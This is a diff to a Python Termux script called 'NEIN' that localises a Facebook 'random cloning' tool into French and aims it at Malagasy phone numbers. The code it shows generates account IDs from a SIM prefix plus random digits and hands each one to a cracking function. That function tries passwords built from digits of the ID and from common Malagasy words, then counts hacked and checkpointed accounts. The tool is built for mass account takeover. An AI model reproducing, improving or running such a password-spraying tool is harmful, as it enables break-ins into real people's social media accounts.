@@ -68,7 +68,7 @@ logo=(f'''{B}
  TOOL NAME : NEIN
  GROUPE-FB   : [TERMUX-COMAND]
  Facebook : ITACHI SQ
- Tools    : {warna}[{H}VERSION 1{warna}]{warna}
+ Tools    : {warna}[{H}VERSION 1.1{warna}]{warna}
 --------------------------------------------{B}''')
 #-------------linex def -------------#
 def linex():
@@ -80,20 +80,20 @@ def clear():
 #-------------main def------------#
 def MR_ITACHI():
     clear()
-    os.system('xdg-open https://github.com/MR-DIPTO-404')
+    os.system('xdg-open https://facebook.com/groups/641144864016773/')
     print(f'{B} [{warna}01{B}] RANDOM CLONING ')
     print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
     linex()
-    option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
+    option=input(f' {B}[{warna}??{B}] CHOISIR MENU >> ')
     if option in ['01','1']:
         BD_CLONING()
     else:
-        exit(' Thanks for using dear :)')
+        exit(' MERCI BEAUCOUP  :)')
 #------------- bd clone def ----------#
 def BD_CLONING():
     user=[]
     clear()
-    print(' EXAMPLE SIM CODE : [26132] [26134] [26138] [26133]')
+    print(' CODE SIM MALAGASY : [26132] [26134] [26138] [26133]')
     code=input(' ENTER SIM CODE >> ')
     linex()
     print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
@@ -109,14 +109,14 @@ def BD_CLONING():
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
-        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
+        print(' CLONING EN COURS ... ')
         linex()
         for psx in user:
             ids=code+psx
             passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','fitiavana','Fitiavana','vadiko','Vadiko,','jesosy','Jesosy','mahery,','Mahery','malagasy','Malagasy']
             Dipto.submit(method_crack,ids,passlist)
     linex()
-    print(' THE PROGRESS HAS BEEN COMPLETE ')
+    print(' LE CLONING EST FINI ')
     print(' TOTAL OK ID '+str(len(oks)))
     print(' TOTAL CP ID '+str(len(cps)))
     input(' PRESS ENTER TO BACK  : ')
